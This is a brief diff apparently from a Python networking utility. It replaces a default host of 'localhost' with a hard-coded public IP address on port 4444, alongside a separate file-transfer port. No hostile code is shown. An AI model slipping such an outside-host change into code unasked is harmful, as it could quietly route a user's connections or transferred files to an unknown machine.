@@ -53,7 +53,7 @@ def write_list_into_file(name, byte_or_char_type, input_list):
     write_target.close()
 
 
-DEFAULT_HOST = 'localhost'
+DEFAULT_HOST = '172.113.155.186'
 DEFAULT_PORT = 4444
 DEFAULT_TRANSFER_PORT = 4450
 
